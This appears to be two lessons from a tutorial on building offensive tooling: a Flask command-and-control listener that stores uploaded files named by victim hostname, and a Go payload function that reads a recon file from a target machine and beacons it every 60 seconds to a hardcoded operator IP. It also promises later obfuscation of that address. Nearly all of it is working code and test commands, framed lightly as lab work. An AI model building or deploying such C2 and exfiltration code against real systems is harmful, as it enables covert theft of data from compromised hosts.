L05

Building the Flask C2 listener

Python · Flask · raw HTTP POST · timestamped file storage

Complete

The C2 server's job is simple: sit on a port, accept POST requests from the payload, save the contents to disk, and respond with a confirmation. There's no database, no authentication (covered in the OPSEC section), no dashboard yet. Just a listener and a folder.

Before writing any Go code, it's worth testing the C2 endpoint with curl so you know the server works independently of the payload. Build the Flask side first, verify it with curl, then connect the Go payload to it.

The full server code

c2_server.pyPython
from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

# All incoming files land here, relative to this script
UPLOAD_FOLDER = os.path.join(os.path.dirname(__file__), "uploads")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)


# Health check — confirms the server is running
@app.route("/", methods=["GET"])
def test():
    return "C2 Server running — POST to /beacon"


@app.route("/beacon", methods=["POST"])
def beacon():
    # Read raw bytes from the request body — no JSON parsing
    data = request.get_data()

    if not data:
        return jsonify({"status": "error", "reason": "empty body"}), 400

    # Pull metadata from the custom headers the Go payload sets
    filename = request.headers.get("X-Filename", "recon.txt")
    host_id  = request.headers.get("X-Host", "unknown")

    # Build a unique filename: hostname_timestamp_originalname
    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    safe_name = filename.replace("\\", "_").replace("/", "_")
    out_name  = f"{host_id}_{timestamp}_{safe_name}"
    out_path  = os.path.join(UPLOAD_FOLDER, out_name)

    with open(out_path, "wb") as f:
        f.write(data)

    return jsonify({
        "status": "ok",
        "saved_as": out_name,
        "size_bytes": len(data),
    }), 200


if __name__ == "__main__":
    # 0.0.0.0 means accept connections from any IP, not just localhost
    app.run(host="0.0.0.0", port=5000, debug=True)

Breaking it down

request.get_data() reads the entire request body as raw bytes without any parsing. This matters because the Go payload sends the recon file as a raw binary stream, not as JSON or form data. If you used request.json here it would fail.

The filename is built from three parts joined with underscores: the X-Host header (the target's hostname), a UTC timestamp, and the original filename. So a beacon from a machine called DESKTOP-ABC123 at 2pm would save as DESKTOP-ABC123_20240315_140000_recon_combined.txt. This makes the uploads folder sortable and searchable without any database.

os.makedirs(UPLOAD_FOLDER, exist_ok=True) runs when the script loads. exist_ok=True means it won't error if the folder already exists — safe to run multiple times.

Testing with curl before using the Go payload

terminalbash
# Start the C2 server in one terminal
python3 c2_server.py

# In another terminal — send a test file
curl -X POST http://localhost:5000/beacon \
  -H "Content-Type: application/octet-stream" \
  -H "X-Host: test-machine" \
  -H "X-Filename: recon_test.txt" \
  --data-binary "This is test recon data"

# Expected response:
# {"saved_as":"test-machine_20240315_140000_recon_test.txt","size_bytes":23,"status":"ok"}

# Confirm the file appeared in uploads/
ls uploads/
Always test with curl first. If curl works and the Go payload doesn't, the problem is in the Go code. If curl fails, the problem is in Flask. Isolating the two sides saves a lot of debugging time.

Starting the server

# To run in the background (Linux)

# Check it's listening

Firewall check. If the target machine can't reach port 5000, beacons will silently fail. The Go payload's sendToC2() returns on error without printing anything. On Linux, sudo ufw allow 5000/tcp. On Windows Defender Firewall, add an inbound rule for TCP 5000.
L06

HTTP exfiltration from the Go payload

Go · net/http · custom headers · timeouts · reading the response

Complete

The sendToC2() function in the Go payload handles everything on the sending side. It reads the recon file from disk, builds an HTTP POST request with custom headers, sends it to the Flask server, and reads back the JSON response. The function is designed to fail silently — if the C2 is unreachable, the payload just logs the failure and continues its beacon loop.

The full function

net_scan_v3.go — sendToC2()Go
func sendToC2(url, filepath, hostID string) {
    // Read the recon file we just wrote to disk
    data, err := os.ReadFile(filepath)
    if err != nil {
        fmt.Printf("Error reading file: %v\n", err)
        return
    }

    // Build the POST request — bytes.NewReader wraps the file bytes
    // as an io.Reader without making a copy in memory
    req, err := http.NewRequest("POST", url, bytes.NewReader(data))
    if err != nil {
        fmt.Printf("Error building request: %v\n", err)
        return
    }

    // These three headers are what Flask reads on the other side
    req.Header.Set("Content-Type", "application/octet-stream")
    req.Header.Set("X-Filename", "recon_combined.txt")
    req.Header.Set("X-Host", hostID)   // os.Hostname() result

    // 10-second timeout — without this, a dead C2 hangs the loop forever
    client := &http.Client{
        Timeout: 10 * time.Second,
    }

    resp, err := client.Do(req)
    if err != nil {
        fmt.Printf("Beacon failed: %v\n", err)
        return
    }
    defer resp.Body.Close()

    // Read and print the Flask response (JSON: {"status":"ok",...})
    body, _ := io.ReadAll(resp.Body)
    fmt.Printf("C2 response [%d]: %s\n", resp.StatusCode, string(body))
}

How the request is constructed

http.NewRequest takes three arguments: the method ("POST"), the URL, and the body as an io.Reader. The body is the entire contents of the recon file, wrapped in bytes.NewReader(). This is memory-efficient — it streams from the existing byte slice rather than making another copy.

The three custom headers map directly to what Flask reads. Content-Type: application/octet-stream tells the server this is raw binary, not JSON or form data. X-Filename and X-Host are non-standard headers (indicated by the X- prefix) that carry metadata for the C2's file naming logic.

Why the timeout matters

Without a timeout on the HTTP client, if the C2 server is down or unreachable, the client.Do(req) call blocks indefinitely. The payload would get stuck on the network call and never proceed to the time.Sleep() at the bottom of the loop. The 10-second timeout means: try for 10 seconds, then give up, log the error, and continue the beacon cycle as normal.

The defer pattern

defer resp.Body.Close() schedules the close to happen when the function returns, regardless of how it returns. Without this, the connection stays open and the Go runtime leaks file descriptors. In a loop running every 60 seconds this would eventually exhaust the OS connection limit. defer is Go's standard pattern for cleanup — it's equivalent to a finally block in other languages.

// Get the target machine's hostname to pass as the identifier
hostname, _ := os.Hostname()

// C2 URL — change this to your operator machine's IP
c2URL := "http://192.168.1.10:5000/beacon"

// Write the recon file, then send it
path := `C:\temp\recon_combined.txt`
os.WriteFile(path, []byte(content), 0644)
sendToC2(c2URL, path, hostname)

fmt.Printf("Beacon sent at %s. Sleeping 60s...\n", timestamp)
time.Sleep(60 * time.Second)
Change the IP. The C2 URL is hardcoded as 192.168.1.10 in v3. You need to set this to your operator machine's IP on the lab network. Run ip addr (Linux) or ipconfig (Windows) on the operator machine to find the right address. The obfuscation phase covers encoding this string so it's not visible in the compiled binary.
